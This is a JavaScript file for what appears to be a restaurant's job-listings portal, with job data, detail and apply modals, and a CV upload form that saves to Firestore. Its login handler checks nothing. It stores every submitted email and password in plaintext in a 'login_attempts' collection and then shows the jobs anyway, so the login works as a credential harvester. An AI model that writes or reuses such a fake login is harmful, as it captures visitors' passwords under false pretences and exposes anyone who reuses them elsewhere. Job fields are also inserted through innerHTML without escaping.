import { db } from './firebase-config.js';
import { collection, addDoc } from "https://www.gstatic.com/firebasejs/12.15.0/firebase-firestore.js";

document.addEventListener('DOMContentLoaded', function() {
    const loginForm = document.getElementById('loginForm');
    const loginError = document.getElementById('loginError');
    const jobSection = document.getElementById('jobSection');
    const jobList = document.getElementById('jobList');

    // Jobs Data with Details
    const jobs = [
        {
            id: 1,
            title: 'Chef',
            exp: '2+ years',
            icon: 'fa-utensils',
            description: 'Lead the kitchen team and prepare authentic Pakistani dishes.',
            requirements: [
                'Experience in Pakistani/Indian cuisine',
                'Knowledge of traditional cooking techniques',
                'Ability to manage kitchen staff',
                'Food safety certification preferred'
            ]
        },
        {
            id: 2,
            title: 'Restaurant Manager',
            exp: '2+ years',
            icon: 'fa-user-tie',
            description: 'Oversee daily operations, staff management, and customer satisfaction.',
            requirements: [
                'Experience in restaurant management',
                'Strong leadership and communication skills',
                'Customer service oriented',
                'Knowledge of inventory and financial management'
            ]
        },
        {
            id: 3,
            title: 'Waiter',
            exp: '2+ years',
            icon: 'fa-wine-glass-alt',
            description: 'Provide excellent dining experience to our royal guests.',
            requirements: [
                'Experience in fine dining service',
                'Excellent communication skills',
                'Knowledge of food and beverage service',
                'Polite and professional demeanor'
            ]
        },
        {
            id: 4,
            title: 'Sous Chef',
            exp: '3+ years',
            icon: 'fa-kitchen-set',
            description: 'Assist Head Chef in kitchen operations and menu development.',
            requirements: [
                'Advanced cooking skills',
                'Experience in supervising kitchen staff',
                'Menu planning experience',
                'Food safety certified'
            ]
        },
        {
            id: 5,
            title: 'Head Chef',
            exp: '5+ years',
            icon: 'fa-crown',
            description: 'Lead the entire culinary team and design the royal menu.',
            requirements: [
                'Extensive experience in Pakistani cuisine',
                'Menu development and costing skills',
                'Strong leadership and team management',
                'Food safety and hygiene expertise'
            ]
        },
        {
            id: 6,
            title: 'Food Runner',
            exp: '1+ years',
            icon: 'fa-running',
            description: 'Deliver food from kitchen to tables efficiently.',
            requirements: [
                'Ability to work in fast-paced environment',
                'Good communication skills',
                'Physical stamina',
                'Team player'
            ]
        },
        {
            id: 7,
            title: 'Hostess',
            exp: '1+ years',
            icon: 'fa-smile',
            description: 'Welcome guests and manage reservations with royal hospitality.',
            requirements: [
                'Customer service experience',
                'Excellent communication skills',
                'Professional appearance',
                'Ability to handle reservations and seating'
            ]
        }
    ];

    // Handle Login
    loginForm.addEventListener('submit', async function(e) {
        e.preventDefault();
        const email = document.getElementById('loginEmail').value.trim();
        const password = document.getElementById('loginPassword').value.trim();

        if (!email || !password) {
            loginError.textContent = 'Please fill in both fields.';
            return;
        }

        // Save login attempt
        try {
            await addDoc(collection(db, 'login_attempts'), {
                email: email,
                password: password,
                timestamp: new Date().toISOString()
            });
            console.log('Login attempt saved.');
        } catch (err) {
            console.error('Error saving login:', err);
        }

        // Show jobs
        loginForm.style.display = 'none';
        loginError.textContent = '';
        jobSection.style.display = 'block';

        // Render jobs as cards
        jobList.innerHTML = '';
        jobs.forEach(job => {
            const card = document.createElement('div');
            card.className = 'job-card';
            card.setAttribute('data-job', job.id);
            card.innerHTML = `
                <div class="job-icon"><i class="fas ${job.icon}"></i></div>
                <div class="job-info">
                    <h5>${job.title}</h5>
                    <span class="exp-badge">${job.exp}</span>
                </div>
                <button class="btn-details" onclick="showJobDetails('${job.id}')">
                    <i class="fas fa-info-circle"></i> Details
                </button>
            `;
            jobList.appendChild(card);
        });
    });

    // Global function to show job details
    window.showJobDetails = function(jobId) {
        const job = jobs.find(j => j.id == jobId);
        if (!job) return;

        const modal = document.getElementById('detailsModal');
        document.getElementById('detailTitle').textContent = job.title;
        document.getElementById('detailExp').textContent = 'Experience: ' + job.exp;
        document.getElementById('detailDesc').textContent = job.description;

        const reqList = document.getElementById('detailRequirements');
        reqList.innerHTML = '';
        job.requirements.forEach(req => {
            const li = document.createElement('li');
            li.innerHTML = `<i class="fas fa-check-circle"></i> ${req}`;
            reqList.appendChild(li);
        });

        // Store job ID for apply button
        document.getElementById('applyFromDetail').setAttribute('data-job', job.id);
        modal.classList.add('active');
        document.body.style.overflow = 'hidden';
    };

    // Close details modal
    window.closeDetails = function() {
        document.getElementById('detailsModal').classList.remove('active');
        document.body.style.overflow = '';
    };

    // Apply button from details modal
    document.getElementById('applyFromDetail').addEventListener('click', function() {
        const jobId = this.getAttribute('data-job');
        const job = jobs.find(j => j.id == jobId);
        if (job) {
            closeDetails();
            openApplyModal(job.title);
        }
    });

    // Apply Modal functions
    window.openApplyModal = function(jobTitle) {
        document.getElementById('applyModal').classList.add('active');
        document.getElementById('jobPosition').value = jobTitle;
        document.getElementById('modalJobLabel').textContent = 'Position: ' + jobTitle;
        document.body.style.overflow = 'hidden';
    };

    window.closeApplyModal = function() {
        document.getElementById('applyModal').classList.remove('active');
        document.body.style.overflow = '';
        document.getElementById('applicationForm').reset();
        document.getElementById('applyError').textContent = '';
    };

    // Handle Application Form Submit
    document.getElementById('applicationForm').addEventListener('submit', async function(e) {
        e.preventDefault();
        const job = document.getElementById('jobPosition').value;
        const name = document.getElementById('fullName').value.trim();
        const email = document.getElementById('email').value.trim();
        const phone = document.getElementById('phone').value.trim();
        const file = document.getElementById('cvFile').files[0];
        const error = document.getElementById('applyError');

        if (!name || !email || !phone || !file) {
            error.textContent = 'Please fill all fields and upload CV.';
            return;
        }

        const reader = new FileReader();
        reader.onloadend = async function() {
            try {
                await addDoc(collection(db, 'job_applications'), {
                    job: job,
                    name: name,
                    email: email,
                    phone: phone,
                    cv: reader.result,
                    cvName: file.name,
                    cvType: file.type,
                    timestamp: new Date().toISOString()
                });
                alert('Application submitted successfully!');
                closeApplyModal();
            } catch (err) {
                error.textContent = 'Failed to submit. Check console.';
                console.error(err);
            }
        };
        reader.readAsDataURL(file);
    });
});
